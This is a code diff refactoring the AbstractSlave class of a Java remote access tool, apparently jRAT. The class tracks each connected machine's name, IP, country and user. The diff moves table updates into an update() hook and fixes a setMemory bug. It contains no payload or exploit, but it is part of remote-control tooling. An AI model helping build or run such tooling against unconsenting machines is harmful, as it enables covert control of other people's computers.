@@ -23,10 +23,8 @@ import se.jrat.client.net.ServerListener;
 import se.jrat.client.settings.CountryStatistics;
 import se.jrat.client.settings.CustomID;
 import se.jrat.client.settings.Settings;
-import se.jrat.client.ui.frames.Frame;
 import se.jrat.client.ui.panels.PanelMainLog;
 import se.jrat.client.utils.FlagUtils;
-import se.jrat.client.utils.Utils;
 import se.jrat.common.Version;
 import se.jrat.common.codec.Hex;
 import se.jrat.common.crypto.Crypto;
@@ -46,9 +44,9 @@ public abstract class AbstractSlave implements Runnable {
 	protected DataOutputStream dos;
 	protected DataInputStream dis;
 	
-	protected String computername = "";
-	protected String renamedid = "";
-	protected String localip = "";
+	protected String computername;
+	protected String renamedid;
+	protected String localip;
 	
 	protected String country;
 	protected PublicKey rsaKey;
@@ -157,6 +155,10 @@ public abstract class AbstractSlave implements Runnable {
 		uniqueId = (long) (new Random()).nextInt(Integer.MAX_VALUE); // TODO change to int
  
 		this.ip = ip;
+	}
+	
+	public void update() {
+		
 	}
 	
 	public void writeLine(String s) {
@@ -312,6 +314,7 @@ public abstract class AbstractSlave implements Runnable {
 		this.ping = (int) ping;
 	}
 	
+	// TODO
 	public abstract String getDisplayName();
 	
 	public String getUsername() {
@@ -334,6 +337,8 @@ public abstract class AbstractSlave implements Runnable {
 		if (entry != null) {
 			setRenamedID(entry.getName());
 		}
+		
+		update();
 	}
 	
 	public String getRenamedID() {
@@ -390,15 +395,7 @@ public abstract class AbstractSlave implements Runnable {
 
 	public void setCountry(String country) {
 		this.country = country;
-		
-		
-		int row = Utils.getRow(this);
-
-		if (row != -1) {
-			Frame.mainModel.setValueAt(this.getCountry().toUpperCase().trim(), row, 0);
-			Frame.mainTable.repaint();
-		}
-		
+				
 		CountryStatistics.getGlobal().add(this);
 	}
 
@@ -416,8 +413,6 @@ public abstract class AbstractSlave implements Runnable {
 
 	public void setComputerName(String name) {
 		this.computername = name;
-		
-		Frame.mainModel.setValueAt(formatUserString(), Utils.getRow(3, getIP()), 5);
 	}
 	
 	public String formatUserString() {
@@ -449,10 +444,6 @@ public abstract class AbstractSlave implements Runnable {
 
 	public void setLocalIP(String localip) {
 		this.localip = localip;
-
-		int row = Utils.getRow(this);
-
-		Frame.mainModel.setValueAt(localip, row, 8);
 	}
 
 	public int getStatus() {
@@ -461,14 +452,14 @@ public abstract class AbstractSlave implements Runnable {
 
 	public void setStatus(int status) {
 		this.status = status;
+		update();
 	}
-	
 
 	public int getMemory() {
 		return memory;
 	}
 
 	public void setMemory(int ram) {
-		this.memory = memory;
+		this.memory = ram;
 	}
 }
